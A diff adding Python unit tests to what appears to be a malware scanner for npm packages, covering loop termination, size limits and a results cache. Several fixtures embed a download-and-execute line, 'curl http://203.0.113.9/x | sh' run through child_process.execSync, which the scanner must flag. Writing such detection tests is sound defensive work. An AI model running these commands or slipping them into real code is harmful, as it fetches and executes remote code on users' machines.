@@ -595,5 +595,81 @@ class JSNormal(unittest.TestCase):
             js.analyze_source(ctx, "var a = 1;\n" * 200, "index.js", "import")
 
 
+class LargePackages(unittest.TestCase):
+    def test_work_list_loop_ends(self):
+        # webpack's WebAssemblyInInitialChunkError.js: a for-of over a queue that the body pushes onto. Walked as the
+        # array grew, the message string doubled each turn until the 2 MB value cap (123 s for a 3 KB file)
+        import time
+        src = ("function chains(m, g) {\n  const queue = [{head: m, message: 'x'}];\n  const out = new Set();\n"
+               "  for (const c of queue) {\n    for (const conn of g.incoming(c.head)) {\n"
+               "      const msg = `${conn.origin.name} --> ${c.message} ${c.message}`;\n"
+               "      queue.push({head: conn.origin, message: msg});\n    }\n    out.add(c.message);\n  }\n"
+               "  return [...out];\n}\nmodule.exports = chains;\n")
+        t = time.monotonic()
+        self.assertEqual(js_code(src), set())
+        self.assertLess(time.monotonic() - t, 5)
+
+    def test_work_list_loop_still_reads_items(self):
+        got = js_code("const cp = require('child_process');\nconst q = ['echo'];\n"
+                      "for (const x of q) { if (q.length < 3) q.push('curl http://203.0.113.9/a | sh'); else cp.execSync(x); }\n")
+        self.assertIn(("download_exec", "import"), got)
+
+    def test_file_over_value_cap_is_read(self):
+        # a package file is read up to the file size limit; the value cap (max_string) is for strings built at run time
+        ctx = behavior.Context()
+        ctx.limits = dict(ctx.limits, max_string=1000)
+        src = "var a = 1;\n" * 300 + "require('child_process').execSync('curl http://203.0.113.9/x | sh');\n"
+        js.analyze_source(ctx, src, "index.js", "import")
+        self.assertIn("download_exec", {f for (f, _ph, _file, _line) in ctx.facts})
+        with self.assertRaises(behavior.LimitExceeded):     # built code over the value cap is still not read
+            js.analyze_source(ctx, src, "index.js", "import", depth=1, line_base=1)
+
+    def test_facts_cache_reuses_and_keys_by_content(self):
+        import os
+        from behavior import facts_cache
+        d = tempfile.mkdtemp()
+        old = {k: os.environ.get(k) for k in ("AEGIS_FACTS_CACHE", "AEGIS_FACTS_CACHE_DIR")}
+        os.environ.update({"AEGIS_FACTS_CACHE": "1", "AEGIS_FACTS_CACHE_DIR": d})
+        facts_cache._conn = None
+        bad = "require('child_process').execSync('curl http://203.0.113.9/x | sh');\n"
+        try:
+            def run(src):
+                paths, inst = npm_package({"index.js": src})
+                feats = types.SimpleNamespace(ecosystem="npm", install_time_files=inst, evidence=[])
+                ctx = behavior.analyze_files(paths, feats)
+                return {(f, ph) for (f, ph, _file, _line) in ctx.facts}
+            first = run(bad)
+            calls = []
+            orig = js.analyze_source
+            js.analyze_source = lambda *a, **k: (calls.append(a[2]), orig(*a, **k))[1]
+            try:
+                again = run(bad)
+                self.assertEqual(again, first)
+                self.assertIn(("download_exec", "import"), again)
+                self.assertNotIn("index.js", calls)             # read from the cache
+                changed = run(bad + "// one byte more\n")
+                self.assertIn("index.js", calls)                # other content: read again
+                self.assertEqual(changed, first)
+            finally:
+                js.analyze_source = orig
+        finally:
+            facts_cache._conn = None
+            for k, v in old.items():
+                if v is None:
+                    os.environ.pop(k, None)
+                else:
+                    os.environ[k] = v
+
+    def test_facts_cache_skips_file_that_depends_on_another(self):
+        from behavior import facts_cache
+        ctx = behavior.Context()
+        rec = facts_cache.Recorder(ctx, "a.js")
+        ctx.add_downloaded("/tmp/p")                         # a.js writes a download: its own result
+        self.assertEqual(rec.entry()["down"], ["/tmp/p"])
+        rec = facts_cache.Recorder(ctx, "b.js")
+        ctx.was_downloaded("/tmp/p")                         # b.js's answer comes from a.js
+        self.assertIsNone(rec.entry())
+
+
 if __name__ == "__main__":
     unittest.main(verbosity=1)
